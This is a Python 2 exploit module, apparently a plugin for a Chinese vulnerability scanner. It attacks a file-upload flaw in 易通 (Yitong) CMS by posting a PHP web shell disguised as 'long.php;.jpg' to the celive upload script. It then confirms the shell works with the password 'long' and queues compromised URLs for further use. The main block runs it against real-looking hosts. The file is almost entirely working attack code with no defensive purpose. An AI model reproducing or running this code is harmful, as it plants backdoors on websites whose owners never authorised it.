#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#############################易通cms上传shell漏洞###########################
#参考http://www.shack2.org/article/168.html
import urllib2
import sys
import UPLOAD   #上传组件
import re
import threading
import requests
import socket
socket.setdefaulttimeout(10)  #设置了全局默认超时时间

from class_Queue import url_exp
from yijuhua_CS import yijuhua_cs

class etcms_Upload_shell:
    def assign(self,service, arg=None):
        if service == 'etcms':
            return True, arg

    def scan(self,arg):
        try:
            url0, url1 = arg
            opener = urllib2.build_opener(UPLOAD.MultipartPostHandler)
            params = {"fileToUpload" : open("long.php;.jpg","rb")}
            url = url1+'/celive/live/doajaxfileupload.php'
            req = opener.open(url,params)
            html = req.read()
            murl = re.compile("<a href='(.*?)'")
            ok = murl.findall(html)
            #print ok
            if ok and '.php;.jpg' in ok[0]:
                if yijuhua_cs("php",ok[0],"long"):   #ASP还是PHP  ,URL地址 ，密码
                #是
                    EXP_list=[1,url0,url1,"CN_exp_etcms_Upload_shell",ok[0],"long","webshell"]
                    #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                    #print EXP_list
                    url_exp.put(EXP_list,0.5)   #插入队列
                else:
                #否
                    EXP_list=[0,url0,url1,"CN_exp_etcms_Upload_shell",ok[0],"long","webshell"]
                    #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                    #print EXP_list
                    url_exp.put(EXP_list,0.5)   #插入队列
#                print "exp_kingcms_getshell---%s---%s"%(ok[0],"webshell--pass:long")
        except Exception,e:
            print e
            pass


################################################
if __name__=='__main__':
    class_www=etcms_Upload_shell()
    class_www.scan(class_www.assign('etcms', ("http://www.baidu.com","http://91qingniao.com"))[1])

















